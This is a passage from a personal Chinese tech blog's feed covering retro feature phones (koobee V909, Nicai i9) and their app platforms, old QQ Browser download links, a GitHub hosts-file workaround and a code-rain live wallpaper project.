        <content type="html"><![CDATA[<p>&ensp;&ensp;十年前，功能机还是百花齐放，安卓/iOS智能机没有今天这么普及  </p><p>&ensp;&ensp;记一个10年前的功能机，koobee V909，多图预警，流量慎重  </p><a id="more"></a>  <p>&ensp;&ensp;安卓/iOS设备火热后，功能机也开始摆脱Symbian那种九宫格菜单，开始加入智能机的桌面/锁屏元素，从外观上变得智能化，如尼彩，分别制作了类似iOS/安卓的两种不同的UI  </p><p>&ensp;&ensp;今天这部手机也是那时候的产物，先来看一下锁屏，有没有iOS5/6的视感<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065141.jpg" alt="image">  </p><p>&ensp;&ensp;放音乐时锁屏也可以展示歌曲信息，按home键后可以快捷操作<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065043.jpg" alt="image"></p><p>&ensp;&ensp;进入桌面，便可以看到平铺展开的软件，桌面上软件图标包括系统软件（功能入口）、mrp软件（mrp主入口）、JAVA应用程序、VRE平台应用程序（vxp软件）<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065151.jpg" alt="image"></p><p>&ensp;&ensp;手机系统自称KOS，完成度比较高，不像斯凯mrp平台，只能从主入口进入，系统设置也是iOS的拟物风格<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065246.jpg" alt="image">  </p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065253.jpg" alt="image"></p><p>&ensp;&ensp;作为晚期的功能机，也用上了电容式触摸屏和WIFI功能，早期的手机一般无触屏或电阻屏，需要用触控笔或指甲盖点击操作，WIFI则是当时国内主推WAPI标准，国行机无法使用WIFI<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065348.jpg" alt="image"></p><p>&ensp;&ensp;作为功能机，它拥有现在全面屏手机标配的手势操作<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065308.jpg" alt="image"></p><p>&ensp;&ensp;和尼彩i9手机一样，他的菜单是安卓2.3风格的<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065435.jpg" alt="image"></p><p>&ensp;&ensp;也和尼彩手机一样拥有安卓设备的通知栏（早期iOS并没有通知栏功能）<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065506.jpg" alt="image"></p><p>&ensp;&ensp;KOS的通知栏也比较完善，可以展示应用通知，快速管理VRE软件后台<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072844.jpg" alt="image">  </p><p>&ensp;&ensp;酷比的JAVA功能也比其他功能机的JAVA强劲，可以3个JAVA后台程序，其他功能机普遍只有一个或者只允许前台运行<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072959.jpg" alt="image"></p><p>&ensp;&ensp;酷比也在桌面上集成了任务管理器<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072859.jpg" alt="image"></p><p>&ensp;&ensp;软件拓展在功能机里也算是比较全面的了，自带乐酷市场<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072720.jpg" alt="image"></p><p>&ensp;&ensp;同时可以使用VRE平台的AppStore来获取更多应用<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072439.jpg" alt="image">  </p><p>&ensp;&ensp;VRE作为联发科钦定的应用平台（沃勤公司有联发科的注资），诺基亚也有手机使用过这个平台，应用商店自己的关于<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072452.jpg" alt="image"></p><p>&ensp;&ensp;手机支持斯凯mrp，怎么能少了斯凯的应用商店<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_070929.jpg" alt="image">  </p><p>&ensp;&ensp;冒泡的关于信息<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_085207.jpg" alt="image"></p><p>&ensp;&ensp;这是几个当时软件/游戏的照片<br>&ensp;&ensp;TOM猫<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072731.jpg" alt="image"></p><p>&ensp;&ensp;愤怒的小鸟<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072251.jpg" alt="image">  </p><p>&ensp;&ensp;松鼠大战<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072217.jpg" alt="image"></p><p>&ensp;&ensp;涂鸦雷电（一个融合了涂鸦跳跃和雷霆战机的游戏）<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_085955.jpg" alt="image"></p><p>&ensp;&ensp;作为一个能运行软件的半智能机，怎么能少了主流聊天软件QQ<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_071109.jpg" alt="image"></p><p>&ensp;&ensp;手机预装腾讯自家的tmc软件平台<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_071119.jpg" alt="image"></p><p>&ensp;&ensp;作为支持JAVA的手机，也少不了JAVA的QQ<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_071045.jpg" alt="image">  </p><p>&ensp;&ensp;手机支持腾讯tmc软件平台，腾讯却又为其制作了JAVA专版QQ，蜜汁操作<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_071055.jpg" alt="image"></p><p>&ensp;&ensp;同时，还能运行VRE平台的QQ<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_090913.jpg" alt="image"></p><p>&ensp;&ensp;VREQQ的关于信息<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_091238.jpg" alt="image"></p><p>&ensp;&ensp;mrp作为当时功能机预装最多的平台，怎么能少了mrp的QQ<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_091212.jpg" alt="image"></p><p>&ensp;&ensp;这个QQ是消失的彩虹海基于官方空挂QQ修改的，更多功能（mrp版最新应该是QQ2010）<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072008.jpg" alt="image">   </p><p>&ensp;&ensp;这QQ的拓展怎么样，硬件四开，和现在安卓的应用双开比是不是有点牛啤  </p><p>&ensp;&ensp;这个手机不知道是VRE程序的拓展还是酷比KOS集成，文件可以直接通过电子邮件发送或是分享到微博，其他功能机大多只有蓝牙和彩信<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072352.jpg" alt="image"></p><p>&ensp;&ensp;关于VRE，沃勤公司制作的中间件软件平台，程序可以直接在文件管理器选择安装或运行，软件格式vxp<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072617.jpg" alt="image"></p><p>&ensp;&ensp;手机的基本配置<br>&ensp;&ensp;关于手机<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_091934.jpg" alt="image"></p><p>&ensp;&ensp;关于KOS<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072640.jpg" alt="image"></p><p>&ensp;&ensp;mrp平台读到的手机硬件信息<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065745.jpg" alt="image"></p><p>&ensp;&ensp;VRE平台读到的硬件信息<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/IMG_20210327_065549.jpg" alt="image"></p><p>&ensp;&ensp;手机的功能检测<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_072116.jpg" alt="image"></p><p>&ensp;&ensp;迷惑点来了，mrp读到平台MT6236，VRE平台读到MT6253，不慌，跑个分试试<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_065819.jpg" alt="image"></p><p>&ensp;&ensp;单设备跑分看不出什么，和其他设备比一下就好，先看一下其他设备的参数，最后一个设备因为屏幕小一直滚动显示，没拍上，单独说一下<br>&ensp;&ensp;设备依次是波导E66、酷比V909、长虹A6<br>&ensp;&ensp;CPU分别显示MT6236、MT6236、MT6250<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/IMG_20210319_055943.jpg" alt="image"><br>&ensp;&ensp;补图<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/MVIMG_20210327_093532.jpg" alt="image"></p><p>&ensp;&ensp;跑分结果<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/IMG_20210319_074318.jpg" alt="image"></p><p>&ensp;&ensp;酷比跑分一骑绝尘<br>&ensp;&ensp;拉个模拟器选手看看，诺基亚塞班手机，运行mrp模拟器（图片来自bilibili@触李白）<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/279ff32b6eaea454.jpg" alt="image"></p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/koobee-v909/-2dc31a6e93959569.jpg" alt="image"><br>&ensp;&ensp;酷比这跑分实属牛啤，要赶上模拟器了</p><p>&ensp;&ensp;后：简单记录一个10年前的功能机，当时可玩性不错，可惜随着智能机普及，功能机逐渐没落了，上文中的中间件平台也已经停运了，想在网上找到对应的软件并不容易，功能机平台倒是还剩一个掌盟一直运营，掌盟把短信付费方式改成了微信扫码付费，并不建议尝试</p>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旧机博物馆 尼彩i9</title>
      <link href="/2021/jiu-ji-bo-wu-guan-ni-cai-i9/"/>
      <url>/2021/jiu-ji-bo-wu-guan-ni-cai-i9/</url>
      
        <content type="html"><![CDATA[<p>手里仅存的几部非安卓机，尼彩手机<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="受虐滑稽">  </p><a id="more"></a>  <p>从家里翻出来的包装<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic0.jpg" alt="image"></p><p>尼彩手机外观有仿安卓的，也有仿苹果的，主要仿苹果那个尼彩i8，仿安卓的尼彩i9，广告里也叫尼彩DaDa智能机，我这个是仿安卓的，以前用着还行<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt="受虐滑稽"><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic1.jpg" alt="image"></p><p>手机桌面<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic2.jpg" alt="image"></p><p>安卓2.3风格的菜单<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic3.jpg" alt="image"></p><p>仿安卓连安卓的通知栏都搬过来了，记得早期通知栏就安卓有，那时候iOS都没这功能<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic4.jpg" alt="image"></p><p>动态壁纸怎么能少<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic5.jpg" alt="image"></p><p>这手机自带一个应用商店，当时玩过一些功能机的中间件平台，没搞懂尼彩的<img src="/img/preloader.gif" data-original="/coolapk-emotion/44_pen.gif" alt="喷"><br>尼彩应用商店下的软件格式cbe，可以单独安装aps格式的软件，安装界面仿的安卓，当时能玩的东西还不错<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic6.jpg" alt="image"><br>应用商店早期拟物的iOS 应用商店风格<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic7.jpg" alt="image"><br>当时国内其他中间件平台也差不多这种风格<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic8.jpg" alt="image"><br>额外的aps软件安装<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic9.jpg" alt="image"><br>安装风格安卓的应用安装</p><p>当时的手机一般只能用一个中间价平台玩游戏，这个尼彩有点多</p><p>斯凯mrp估计很多人都玩过吧，当时腾讯抄mrp做了个自己的tmc平台<img src="/img/preloader.gif" data-original="/coolapk-emotion/62_huaji.gif" alt="滑稽"><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic10.jpg" alt="image"><br>看这个介绍尼彩用的mstar平台？<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic11.jpg" alt="image"><br>当时腾讯自称MCare平台或Q-Service服务，来自<a href="https://www.cnbeta.com/articles/tech/122197.htm" target="_blank" rel="noopener">cnBeta的介绍</a><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic12.jpg" alt="image"></p><p>悠米的jra估计也有人用过吧，看清楚不是java的jar<img src="/img/preloader.gif" data-original="/coolapk-emotion/82_miaomiao.gif" alt="二哈">，这个手机也有，不过现在悠米平台估计已经关了，手机上有入口不过进不去了<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic13.jpg" alt="image"></p><p>作为当时的山寨机皇怎么能少了JAVA<img src="/img/preloader.gif" data-original="/coolapk-emotion/65_coshuaji.gif" alt="cos滑稽"><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic14.jpg" alt="image"></p><p>作为一个山寨机，配置当然不够看，手机内存85m，还好当时的手机东西都可以放内存卡里，用Java软件看的运存，不知道准不准，3m多点，比mrp的RAM650k要好些<img src="/img/preloader.gif" data-original="/coolapk-emotion/63_liuhanhuaji.gif" alt="流汗滑稽"><br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic15.jpg" alt="image"><br>手机储存和RAM<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic16.jpg" alt="image"></p><p>当时有一些小游戏还不错，下面是几张游戏的照片<img src="/img/preloader.gif" data-original="/coolapk-emotion/65_coshuaji.gif" alt="cos滑稽">，尼彩的（独家？）游戏孤岛<br><img src="/img/preloader.gif" data-original="1085.png" alt="image">做的不错（网友评论），这个游戏仅尼彩手机有，未见登录别的手机，可惜没留下照片<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic17.jpg" alt="image"><br>愤怒的小鸟<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic18.jpg" alt="image"><br>水果忍者<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic19.jpg" alt="image"><br>植物大战僵尸</p><p>这几个游戏各中间件平台一般都会有</p><p>看其他酷友回答这个问题时有个说了吹裙子游戏，这样的游戏尼彩手机怎么能少的了<img src="/img/preloader.gif" data-original="/coolapk-emotion/65_coshuaji.gif" alt="cos滑稽">还有其它类似的，游戏图片就不放了，放个应用列表<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/nicai-i9/pic20.jpg" alt="image"><br>当时监管松？还是手机厂商问了买手机增加噱头？<br>这种游戏在应用商店也能上架下载（包括安卓2.x时期的安卓应用商店），现在都没了</p><p>关于中间件平台，斯凯mrp平台相关的文件可以在这里查看，包含SDK等<br><a href="https://github.com/zengming00/mrpdev" target="_blank" rel="noopener">https://github.com/zengming00/mrpdev</a>  </p><p>尼彩这个手里并没有多少资料，提供两个尼彩手机提取的程序供爱好者研究<a href="AppStore.CBE">尼彩AppStore.CBE</a> . <a href="僵尸先生.CBE">僵尸先生.CBE</a> .  <a href="过劳死_M_240X400.APS">过劳死<em>M</em>240X400.APS</a>  </p><p>CBE应该是酷吧平台的程序，但尼彩的CBE并不运行在酷吧的目录，而是在 <code>.system</code> 目录（尼彩同安卓， <code>.</code> 开头的为隐藏文件）<br>应用商店 <code>.system/AS_MSTAR_WQVGA</code><br>普通程序 <code>.system/MB_MSTAR_WQVGA</code><br>APS文件安装后会释放CBE文件  </p><p>不知道是不是一家尼彩的cbe是升级产品或是其他，同魔畅/悠米软件格式同为jra，不通用</p><p>附一个雪鲤鱼平台的介绍：<a href="雪鲤鱼软件产品介绍.pdf">雪鲤鱼软件产品介绍.pdf</a></p><blockquote><p>贴本人发布在<a href="https://www.coolapk.com/feed/6316747" target="_blank" rel="noopener">酷安</a>，整理补充后发到个人博客<br>ps. 手机已不开机，文件为以前备份到电脑的，无法做更多的研究</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ浏览器各版本</title>
      <link href="/2021/qq-liu-lan-qi-ge-ban-ben/"/>
      <url>/2021/qq-liu-lan-qi-ge-ban-ben/</url>
      
        <content type="html"><![CDATA[<p>翻出旧手机来玩想到的这个，以前收藏的，没想到腾讯服务器里还一直留着文件，链接可以直接下载  </p><a id="more"></a>  <p>这是10年前国产功能机平台的软件，当时腾讯还不错，各个平台都照顾到了，软件还能下载安装，当然也仅限安装了，现在主流网站都是https协议，用这个QQ浏览器会提示协议不支持，wap百度倒是还能正常使用  </p><p><strong>QQ浏览器下载链接</strong>  </p><ol><li>适用于斯凯平台用户下载<br>手机QQ浏览器3.0Mini(sky)<br>下载链接:<br><a href="http://softfile.3g.qq.com:8080/msoft/179/1104/75860/qqbrowser_mini3_0.mrp" target="_blank" rel="noopener">http://softfile.3g.qq.com:8080/msoft/179/1104/75860/qqbrowser_mini3_0.mrp</a><br>小字体下载链接:<br><a href="http://softfile.3g.qq.com:8080/msoft/179/1104/13143/qbskysmallfont.mrp" target="_blank" rel="noopener">http://softfile.3g.qq.com:8080/msoft/179/1104/13143/qbskysmallfont.mrp</a>  </li><li>适用于沃勤平台用户下载<br>手机QQ浏览器1.3(沃勤)<br>下载链接:<br><a href="http://softfile.3g.qq.com/msoft/179/1104/26824/qqbrowser.vxp" target="_blank" rel="noopener">http://softfile.3g.qq.com/msoft/179/1104/26824/qqbrowser.vxp</a> </li><li>适用于酷宇平台用户下载<br>手机QQ浏览器1.3(酷宇)大字体<br>下载链接:<br><a href="http://softfile.3g.qq.com/msoft/179/1104/7677/QQBrowser1.3(MTK)_big.mz" target="_blank" rel="noopener">http://softfile.3g.qq.com/msoft/179/1104/7677/QQBrowser1.3(MTK)_big.mz</a><br>手机QQ浏览器1.3(酷宇)小字体<br>下载链接:<br><a href="http://softfile.3g.qq.com/msoft/179/1104/7677/QQBrowser1.3(MTK)_small.mz" target="_blank" rel="noopener">http://softfile.3g.qq.com/msoft/179/1104/7677/QQBrowser1.3(MTK)_small.mz</a> </li><li>适用于扬讯平台用户下载<br>手机QQ浏览器1.0(扬讯)<br>下载链接:<br><a href="http://softfile.3g.qq.com/msoft/179/1104/7677/QQbrowers1.0(mex)_build0001.mex" target="_blank" rel="noopener">http://softfile.3g.qq.com/msoft/179/1104/7677/QQbrowers1.0(mex)_build0001.mex</a></li><li>适用于斯凯用户下载<br>手机QQ浏览器1.3(Sky)<br>下载链接:<br><a href="http://softfile.3g.qq.com:8080/msoft/179/1104/32143/QBrowser1.3.mrp" target="_blank" rel="noopener">http://softfile.3g.qq.com:8080/msoft/179/1104/32143/QBrowser1.3.mrp</a> </li></ol><iframe src="//player.bilibili.com/player.html?aid=502395041&bvid=BV1GK411w7Vr" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/mtk-qqbrowser/Screenshot_20210319190555.jpg" alt="image"><br>酷宇平台 启动页<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/mtk-qqbrowser/Screenshot_20210319190618.jpg" alt="image"><br>酷宇平台 关于页<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/mtk-qqbrowser/Screenshot_20210319190633.jpg" alt="image"><br>斯凯平台 关于页<br><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/mtk-qqbrowser/Screenshot_20210319190953.jpg" alt="image"><br>协议不支持 </p>]]></content>
      
      
      
        <tags>
            
            <tag> 旧机博物馆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改Hosts访问Github</title>
      <link href="/2021/xiu-gai-hosts-fang-wen-github/"/>
      <url>/2021/xiu-gai-hosts-fang-wen-github/</url>
      
        <content type="html"><![CDATA[<p>Github的域名在国内无法正常访问，dns污染？<br>可以通过修改host文件来实现访问  </p><a id="more"></a>  <blockquote><p>以下host来自知乎@乌图米，<a href="https://zhuanlan.zhihu.com/p/148083044" target="_blank" rel="noopener">原帖</a><br>建议去原帖查看，原帖不定时更新</p></blockquote><p>此host粘贴到博客中供快速使用</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># Github Hosts</span><br><span class="line"># Update <span class="number">20210606</span></span><br><span class="line"><span class="number">140.82.113.4</span> github.com</span><br><span class="line"><span class="number">140.82.114.9</span> nodeload.github.com</span><br><span class="line"><span class="number">140.82.114.6</span> api.github.com</span><br><span class="line"><span class="number">140.82.112.10</span> codeload.github.com</span><br><span class="line"><span class="number">185.199.108.133</span> raw.github.com</span><br><span class="line"><span class="number">185.199.108.153</span> training.github.com</span><br><span class="line"><span class="number">185.199.108.153</span> assets-cdn.github.com</span><br><span class="line"><span class="number">185.199.108.153</span> documentcloud.github.com</span><br><span class="line"><span class="number">185.199.108.154</span> help.github.com</span><br><span class="line"></span><br><span class="line"><span class="number">185.199.108.153</span> githubstatus.com</span><br><span class="line"><span class="number">199.232.69.194</span> github.global.ssl.fastly.net</span><br><span class="line"></span><br><span class="line"><span class="number">185.199.108.133</span> raw.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> cloud.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> gist.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> marketplace-screenshots.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> repository-images.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> user-images.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> desktop.githubusercontent.com</span><br><span class="line"></span><br><span class="line"><span class="number">185.199.108.133</span> avatars.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars0.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars1.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars2.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars3.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars4.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars5.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars6.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars7.githubusercontent.com</span><br><span class="line"><span class="number">185.199.108.133</span> avatars8.githubusercontent.com</span><br><span class="line"># End of the section</span><br></pre></td></tr></table></figure><blockquote><p>以下host来自 <a href="https://github.com/jianboy/github-host" target="_blank" rel="noopener">https://github.com/jianboy/github-host</a>  </p></blockquote><p>这是一个Github Actions的项目，host每日更新，<a href="http://blog.yoqi.me/lyq/16489.html" target="_blank" rel="noopener">原帖</a></p><div class="highlight css"><font id="hosts_text" color="#fff"></font> </div><script type="text/javascript">  var url = "https://fastly.jsdelivr.net/gh/jianboy/github-host@master/hosts";  var request = new XMLHttpRequest();  request.open("get", url);  request.send(null);  request.onload = function () {    if (request.status == 200) {      var text = request.responseText;      var element = document.getElementById('hosts_text');      element.innerText = text;    }  }</script><p>Windows系统hosts文件储存在</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>indows<span class="symbol">\S</span>ystem32<span class="symbol">\d</span>rivers<span class="symbol">\e</span>tc<span class="symbol">\h</span>osts</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码雨-动态壁纸</title>
      <link href="/2021/dai-ma-yu-dong-tai-bi-zhi/"/>
      <url>/2021/dai-ma-yu-dong-tai-bi-zhi/</url>
      
        <content type="html"><![CDATA[<p>偶然在 孟坤Web实验室 里看到了<a href="http://lab.mkblog.cn/hacker/" target="_blank" rel="noopener">代码雨</a>效果不住，想做到手机的动态壁纸上  </p><a id="more"></a>  <p>CSDN有介绍制作动态壁纸的，安卓动态壁纸是用 Surface 绘制的，并不能直接嵌套 WebView，在网上找寻好久，最终找到这个，可以直接使用WebView制作动态壁纸  </p><p><a href="https://gist.github.com/iangilman/71650d46384a2d4ae6387f2d4087cc37" target="_blank" rel="noopener">https://gist.github.com/iangilman/71650d46384a2d4ae6387f2d4087cc37</a>  </p><p> 知道这个就方便多了，套壳制作就好<img src="/img/preloader.gif" data-original="/coolapk-emotion/64_shounuehuaji.gif" alt>,关于如何跳转到动态壁纸设置，可以使用这个 <a href="https://blog.csdn.net/flycatdeng/article/details/83867974" target="_blank" rel="noopener">https://blog.csdn.net/flycatdeng/article/details/83867974</a>  </p><p>程序功能本来就不多，就想着极致压缩一下apk体积，AndroidX在程序中只用到了 androidx.localbroadcastmanager.content.LocalBroadcastManager ，遂直接到AOSP的项目里拿了<a href="https://github.com/aosp-mirror/platform_frameworks_support/blob/master/localbroadcastmanager/src/main/java/androidx/localbroadcastmanager/content/LocalBroadcastManager.java" target="_blank" rel="noopener">LocalBroadcastManager.java</a>源码使用，最后打包的apk程序只有 20几k，舒服  </p><p>动态壁纸 <a href="/code">在线预览</a> | <a href="https://github.com/gddhy/CodeRainLiveWallpaper" target="_blank" rel="noopener">项目</a> | <a href="https://res.gddhy.net/app/release/app-release.apk?c=CodeRainLiveWallpaper" target="_blank" rel="noopener">APK下载</a> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>微信信息推送</title>
      <link href="/2021/wei-xin-xin-xi-tui-song/"/>
      <url>/2021/wei-xin-xin-xi-tui-song/</url>
      
